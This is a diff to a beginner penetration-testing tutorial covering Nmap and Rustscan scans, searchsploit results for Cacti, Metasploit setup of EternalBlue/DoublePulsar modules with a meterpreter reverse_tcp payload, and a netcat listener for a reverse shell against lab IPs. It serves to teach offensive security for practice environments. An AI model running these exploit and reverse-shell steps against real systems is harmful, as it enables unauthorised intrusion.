@@ -50,14 +50,35 @@ Service scanning allows us know what applications are running on a computer. The
 Nmap (Network Mapper) allows us to scan the target's port numbers or the targets which are present in the network.
 
 ```
-nmap -sC -sV 10.150.150.18
+nmap -sC -sV -v 10.150.150.18
 ```
 
-> -sC specifies that Nmap scripts should be used to try and obtain more detailed information. <br><br>-sV instructs Nmap to perform a version scan. 
+> -sC specifies that Nmap scripts should be used to try and obtain more detailed information. <br><br>-sV instructs Nmap to perform a version scan. <br><br>[Learn more](https://nmap.org/book/man-briefoptions.html)
 
 In this scan, Nmap will fingerprint services on the target system and identify the service protocol, application name, and version.
 
-![](/assets/images/nmap.png)
+```
+nmap -sC -sV -v 10.150.150.18
+
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-30 11:44 +08
+Nmap scan report for 10.150.150.18
+Host is up (0.31s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 2f:0e:73:d4:ae:73:14:7e:c5:1c:15:84:ef:45:a4:d1 (RSA)
+|   256 39:0b:0b:c9:86:c9:8e:b5:2b:0c:39:c7:63:ec:e2:10 (ECDSA)
+|_  256 f6:bf:c5:03:5b:df:e5:e1:f4:da:ac:1e:b2:07:88:2f (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+| http-title: Welcome to my homepage!
+|_Requested resource was /index.php?page=home
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 87.12 seconds
+```
 
 By default, Nmap will only scan the 1,000 most common ports by default. To scan all 65,535 ports, we can use the -p- tag.
 
@@ -67,7 +88,7 @@ We are barely scratching the surface!
 
 #### Rustscan
 
-To quickly scan all ports in a machine, Rustscan is preferred for me as it will take a long time in Nmap.
+Rustscan is sometimes preferred for me as it scans faster and its output can serve as a cross-reference to Nmap's.
 
 ```
 rustscan -a 10.150.150.18 --range 1-65535 --ulimit 5000
@@ -168,14 +189,40 @@ Now that we are clear on the services running on the ports which our target is r
 
 ### Public Exploits
 Unsurprisingly, Google is one of the way to look for public exploits by simply searching for the application name appended with 'exploit'.
-We can also utilize online exploit databases such as ExploitDB, Rapid7 DB, or Vulnerability Lab.
+We can also utilize online exploit databases such as [ExploitDB](https://www.exploit-db.com), [Rapid7 DB](https://www.rapid7.com/db/), or [Vulnerability Lab](https://www.vulnerability-lab.com).
 
 ### Searchsploit
 Searchsploit enables us to search for public vulnerabilities/exploits for any application.
 
 ```
-searchsploit eternalblue
+searchsploit cacti
 ```
+```
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                                                                               |  Path
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Cacti - 'graph_view.php' Remote Command Execution (Metasploit)                                                                                                                                                               | php/webapps/16881.rb
+Cacti 0.8.6-d - 'graph_view.php' Command Injection (Metasploit)                                                                                                                                                              | php/webapps/9911.rb
+Cacti 0.8.6d - Remote Command Execution                                                                                                                                                                                      | php/webapps/1062.pl
+Cacti 0.8.6i - 'cmd.php?popen()' Remote Injection                                                                                                                                                                            | php/webapps/3029.php
+Cacti 0.8.6i - 'copy_cacti_user.php' SQL Injection Create Admin                                                                                                                                                              | php/webapps/3045.php
+Cacti 0.8.7 (RedHat High Performance Computing [HPC]) - 'utilities.php?Filter' Cross-Site Scripting                                                                                                                          | php/webapps/34504.txt
+Cacti 0.8.7 - '/index.php/sql.php?Login Action login_username' SQL Injection                                                                                                                                                 | php/webapps/31161.txt
+Cacti 0.8.7 - 'data_input.php' Cross-Site Scripting                                                                                                                                                                          | php/webapps/33000.txt
+Cacti 0.8.7 - 'graph.php?view_type' Cross-Site Scripting                                                                                                                                                                     | php/webapps/31157.txt
+Cacti 0.8.7 - 'graph_view.php?filter' Cross-Site Scripting                                                                                                                                                                   | php/webapps/31158.txt
+Cacti 0.8.7 - 'graph_view.php?graph_list' SQL Injection                                                                                                                                                                      | php/webapps/31156.txt
+Cacti 0.8.7 - 'graph_xport.php?local_graph_id' SQL Injection                                                                                                                                                                 | php/webapps/31160.txt
+Cacti 0.8.7 - 'tree.php' Multiple SQL Injections                                                                                                                                                                             | php/webapps/31159.txt
+Cacti 0.8.7e - Multiple Vulnerabilities                                                                                                                                                                                      | php/webapps/10234.txt
+Cacti 0.8.7e - OS Command Injection                                                                                                                                                                                          | php/webapps/12339.txt
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+```
+#### Copy to Clipboard
+After finding a suitable exploit, we can use `-p` to obtain more information about it. The exploit's complete path will also be copied to your clipboard.
+#### Copy to Folder
+As altering exploits in our local copy of database is discouraged, using the `-m` option enables us to select as many exploits we like to be copied into our current working directory. 
 
 ### Metasploit
 Metasploit contains many built-in exploits for many public vulnerabilities and provides an easy way to use these exploits against vulnerable targets. 
@@ -184,24 +231,51 @@ To run Metasploit, we can use the msfconsole command:
 msfconsole
 ```
 
-Once we have Metasploit running, we can search for our target application with the search exploit command.
+Once we have Metasploit running, we can search for our target application with the 'search' command.
 ```
-msf6 > search exploit eternalblue
+msf6 > search eternalblue
 ```
+```
+Matching Modules
+================
 
+   #  Name                                      Disclosure Date  Rank     Check  Description
+   -  ----                                      ---------------  ----     -----  -----------
+   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
+   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
+
+
+Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce
+```
 Once we have identified the exploit we want to use, we can simply key in the command 'use' follow by the number identified for the exploit:
 
 ```
-use 6
+use 4
 ```
-
-Before we can run the exploit, we need to configure its options. To view the options available to configure, we can use the show options command:
-
+Once we have chosen our exploit, we need to configure its options. To view the options available, we can use the 'show options' command:
 ```
-show options
-```
+msf6 exploit(windows/smb/smb_doublepulsar_rce) > show options
 
-Any option with Required set to yes needs to be set for the exploit to work. In this case, we only have two options to set: RHOSTS, which means the IP of our target (this can be one IP, multiple IPs, or a file containing a list of IPs). We can set them with the set command:
+Module options (exploit/windows/smb/smb_doublepulsar_rce):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT   445              yes       The SMB service port (TCP)
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST                      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+```
+Any option with 'Required' set to 'yes' needs to be set for the exploit to work. <br>In this case, we only have two options to set: RHOSTS and LHOST. <br><br>RHOSTS refers to the IP of our target (IP, multiple IPs, or a file containing a list of IPs). LHOST refers to our host machine. <br>They are configured with the `set` command:
 
 ```
 msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
@@ -210,12 +284,30 @@ msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
 LHOST => tun0
 ```
 
-Once we have both options set, we can start the exploitation. We can use the run or exploit command to run the exploit:
+> You may have to run `ifconfig` to obtain the ip address of your LHOST. 
+
+Once we have both options set, we can start the exploitation via the `run` or `exploit` command:
 
 ```
 msf6 exploit(windows/smb/ms17_010_psexec) > exploit
 ```
 
 ## Post Exploitation
+Once we have successfully exploited our target, we need a way to communicate with the target machine to further continue our enumeration process. It is not practical having to exploit the same vulnerability just to execute each command, especially if we exploited our target via manual Remote Code Execution (RCE). 
+
+> Connecting to network services such as SSH (Linux) or WinRM (Windows) also enables us to interact with target machine. However, unless we have the login credentials, such methods deem unfeasible.
+
+### Gaining Foothold
+To achieve reliable and proper communication, we need direct access to our target's system shell.
+
+#### Reverse Shell
+After identifying the vulnerability on our target which allows RCE, we shall first:
+1. Spawn a netcat listener on our machine listening on a specific port (eg. port 9999)
+```
+nc -nlvp 9999
+```
+We now have a netcat listener waiting for a connection. We will trigger the reverse shell connection from the target machine back to our host machine with the netcat listener.
+
+2. Execute the reverse shell command via the exploited vulnerability
 
 ### Privilege Escalation
